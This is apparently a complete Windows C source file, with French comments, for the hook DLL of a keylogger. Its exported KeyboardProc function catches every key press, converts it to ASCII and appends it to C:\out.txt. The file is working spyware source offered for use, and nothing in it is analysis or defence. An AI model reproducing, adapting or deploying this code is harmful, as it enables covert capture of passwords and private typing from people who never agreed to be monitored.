/*
Library hook.dll chargée par le keylogger
by obscurer

21/08/2k
Copyright Tipiak - www.tipiak.net -
*/

#include <windows.h>

BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
return TRUE;
}


__declspec(dllexport) LRESULT CALLBACK KeyboardProc(int code,WPARAM wParam,LPARAM lParam)
{
	
HANDLE File;
long TEMP;
char *buf;
unsigned char *KeyState;
DWORD temp;

buf=(char *)GlobalAlloc(GPTR,5);
KeyState=(unsigned char *)GlobalAlloc(GPTR,256);


TEMP=lParam;
TEMP&=0x40000000;
if(TEMP!=0) { goto die_now; }

	File=CreateFile("C:\\out.txt",GENERIC_WRITE,
						FILE_SHARE_READ+FILE_SHARE_WRITE,
						NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(File==INVALID_HANDLE_VALUE) {  goto die_now; }

	SetFilePointer(File,NULL,NULL,FILE_END);

GetKeyboardState(KeyState);
ToAscii(wParam,lParam,KeyState,(unsigned short *)buf,0);

WriteFile(File,buf,strlen(buf),&temp,NULL);
FlushFileBuffers(File);


CloseHandle(File);

die_now:

GlobalFree(buf);
GlobalFree(KeyState);

return FALSE;
}

//  EOF
